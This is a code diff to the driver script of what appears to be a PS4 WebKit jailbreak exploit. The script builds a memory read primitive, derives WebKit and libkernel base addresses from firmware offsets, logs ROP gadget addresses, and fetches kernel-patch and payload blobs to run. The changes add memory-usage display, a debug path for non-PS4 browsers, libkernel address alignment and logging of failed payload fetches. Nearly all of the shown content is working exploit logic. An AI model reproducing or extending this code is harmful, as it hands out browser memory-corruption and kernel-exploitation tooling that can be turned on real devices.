@@ -1,7 +1,7 @@
-import { establishPrimitive } from "./core.js?v=10";
-import { installWindowP, pairStatus } from "./mem.js";
-import { int64 } from "./int64.js";
-import { offsetsFor } from "./ps4_offsets.js";
+import { establishPrimitive } from "./core.js?v=28";
+import { installWindowP, pairStatus } from "./mem.js?v=1";
+import { int64 } from "./int64.js?v=1";
+import { offsetsFor, PS4 } from "./ps4_offsets.js?v=3";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -13,6 +13,11 @@ const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
 function post(tag, detail) {
+  /* HX1400_POST_DISABLED */
+  if (params.get("hx1400") === "1") {
+    return;
+  }
+
   try {
     const x = new XMLHttpRequest();
     x.open("POST", "/t", true);
@@ -49,6 +54,108 @@ function terse(s) {
 }
 
 const SHOW_LOG = params.get("log") === "1";
+
+/* UPDATE_RAM_BOX */
+const ramBox =
+  document.getElementById("ramBox");
+
+function formatMB(bytes) {
+  bytes = Number(bytes || 0);
+
+  if (bytes <= 0) {
+    return "0MB";
+  }
+
+  return (
+    (bytes / (1024 * 1024)).toFixed(2) +
+    "MB"
+  );
+}
+
+function updateRamBox() {
+  if (!ramBox) {
+    return;
+  }
+
+  let heapText =
+    "JS heap: N/A";
+
+  try {
+    if (
+      performance &&
+      performance.memory
+    ) {
+      const used =
+        Number(
+          performance.memory.usedJSHeapSize || 0,
+        );
+
+      const limit =
+        Number(
+          performance.memory.jsHeapSizeLimit || 0,
+        );
+
+      if (limit > 0) {
+        const percent =
+          used / limit * 100;
+
+        heapText =
+          "JS heap: " +
+          percent.toFixed(1) +
+          "% (" +
+          formatMB(used) +
+          "/" +
+          formatMB(limit) +
+          ")";
+      } else {
+        heapText =
+          "JS heap: " +
+          formatMB(used);
+      }
+    }
+  } catch (ramError) {
+    heapText =
+      "JS heap: error";
+  }
+
+  let coreText =
+    "core: N/A";
+
+  try {
+    const info =
+      globalThis.__CORE_MEM_INFO;
+
+    if (info) {
+      coreText =
+        "core: slots=" +
+        info.slots +
+        " drain=" +
+        info.drainCount +
+        "x" +
+        formatMB(info.drainSize) +
+        " est=" +
+        formatMB(info.estimatedBytes) +
+        " mem=" +
+        info.memLevel;
+    }
+  } catch (coreError) {
+    coreText =
+      "core: error";
+  }
+
+  ramBox.textContent =
+    heapText + " | " + coreText;
+}
+
+if (ramBox) {
+  updateRamBox();
+
+  setInterval(
+    updateRamBox,
+    500,
+  );
+}
+
 if (SHOW_LOG && document.body) document.body.className = "log";
 function finishUI(ok) {
   if (SHOW_LOG || !document.body) return;
@@ -64,27 +171,31 @@ function finishUI(ok) {
 function mark(tag, detail) {
   const raw = detail;
   detail = terse(detail);
-  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
-  if (SHOW_LOG && outEl) {
-    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
-    outEl.innerHTML = lines
-      .map(function (l) {
-        l = esc(l);
-        const c =
-          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(
-            l,
-          )
-            ? "bad"
-            : /WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)
-              ? "warn"
-              : /\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)
-                ? "ok"
-                : "";
-        return c ? '<span class="' + c + '">' + l + "</span>" : l;
-      })
-      .join("\n");
-    outEl.scrollTop = outEl.scrollHeight;
+
+  lines.push(
+    tag +
+    (
+      detail == null || detail === ""
+        ? ""
+        : "  " + detail
+    ),
+  );
+
+  if (lines.length > 600) {
+    lines.splice(
+      0,
+      lines.length - 600,
+    );
   }
+
+  if (SHOW_LOG && outEl) {
+    outEl.textContent =
+      lines.join("\n");
+
+    outEl.scrollTop =
+      outEl.scrollHeight;
+  }
+
   post(tag, raw);
 }
 
@@ -157,7 +268,66 @@ let allDone = false,
     mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
     if (!off) {
-      state("no offsets for this firmware", "bad");
+      /* NONPS4-DEBUG */
+      try {
+        document.body.classList.add("log");
+      } catch (e) {}
+
+      state("not a PS4 browser - debug mode", "warn");
+
+      mark(
+        "NONPS4-DEBUG",
+        "ua=" + (navigator.userAgent || "unknown"),
+      );
+
+      try {
+        mark(
+          "NONPS4-OFFSETS",
+          "supported=" + Object.keys(PS4).join(","),
+        );
+      } catch (e) {
+        mark("NONPS4-OFFSETS", "error=" + String(e));
+      }
+
+      try {
+        const off14 = PS4["14.00"];
+
+        if (off14) {
+          mark(
+            "NONPS4-14",
+            "present " +
+            "webkit=" + off14.wk_expm1_builtin +
+            " poprdi=0x" + off14.wk_POP_RDI_RET.toString(16) +
+            " poprsi=0x" + off14.wk_POP_RSI_RET.toString(16) +
+            " poprdx=0x" + off14.wk_POP_RDX_RET.toString(16),
+          );
+        } else {
+          mark("NONPS4-14", "entry=missing");
+        }
+      } catch (e) {
+        mark("NONPS4-14", "error=" + String(e));
+      }
+
+      try {
+        const info = globalThis.__CORE_MEM_INFO;
+
+        if (info) {
+          mark(
+            "NONPS4-CORE",
+            "hx1400=" + info.hx1400 +
+            " memLevel=" + info.memLevel +
+            " slots=" + info.slots +
+            " drain=" + info.drainCount +
+            " est=" + info.estimatedBytes,
+          );
+        } else {
+          mark("NONPS4-CORE", "info=missing");
+        }
+      } catch (e) {
+        mark("NONPS4-CORE", "error=" + String(e));
+      }
+
+      allDone = true;
       return;
     }
     const fwKey = key || "unknown";
@@ -425,7 +595,28 @@ let allDone = false,
     );
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-    const libkernelBase = errorFn.sub32(off.k__error);
+    let libkernelBase = errorFn.sub32(off.k__error);
+
+    if (HX1400_MODE) {
+      const libkernelAdjust =
+        libkernelBase.low & 0x3fff;
+
+      if (libkernelAdjust !== 0) {
+        libkernelBase =
+          libkernelBase.sub32(
+            libkernelAdjust,
+          );
+
+        mark(
+          "HX1400-LIBKERNEL-ALIGN",
+          "adjust=0x" +
+          libkernelAdjust.toString(16) +
+          " base=" +
+          libkernelBase,
+        );
+      }
+    }
+
     mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
     const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
     if (
@@ -637,6 +828,15 @@ let allDone = false,
       try {
         const r = await fetch(PAYLOAD_FILE);
         if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
+        else
+          mark(
+            "PAYLOAD-FETCH-404",
+            "file=" +
+              PAYLOAD_FILE +
+              " status=" +
+              r.status +
+              " -- blob not shipped, relaunch will be skipped",
+          );
       } catch (e) {}
       if (!blob || blob[0] !== 0xe9) {
         mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
@@ -693,7 +893,7 @@ let allDone = false,
     
     if (params.get("hx1400") === "1") {
       try {
-        const hx = await import("./hx1400_port.js?v=1");
+        const hx = await import("./hx1400_port.js?v=2");
 
         const hxOk = await hx.runHx1400({
           p: p,
@@ -3139,6 +3339,15 @@ const pid = sc(SYS.getpid).i32;
               try {
                 const r = await fetch(KPATCH_FILE);
                 if (r.ok) kpatchBlob = new Uint8Array(await r.arrayBuffer());
+                else
+                  mark(
+                    "KPATCH-FETCH-404",
+                    "file=" +
+                      KPATCH_FILE +
+                      " status=" +
+                      r.status +
+                      " -- blob not shipped for this fw, patch stage fails closed",
+                  );
               } catch (e) {
                 mark("KPATCH-FETCH-THREW", (e && e.message) || String(e));
               }
@@ -3169,6 +3378,15 @@ const pid = sc(SYS.getpid).i32;
               try {
                 const r = await fetch(PAYLOAD_FILE);
                 if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
+                else
+                  mark(
+                    "PAYLOAD-FETCH-404",
+                    "file=" +
+                      PAYLOAD_FILE +
+                      " status=" +
+                      r.status +
+                      " -- blob not shipped for this fw, payload stage fails closed",
+                  );
               } catch (e) {
                 mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
               }
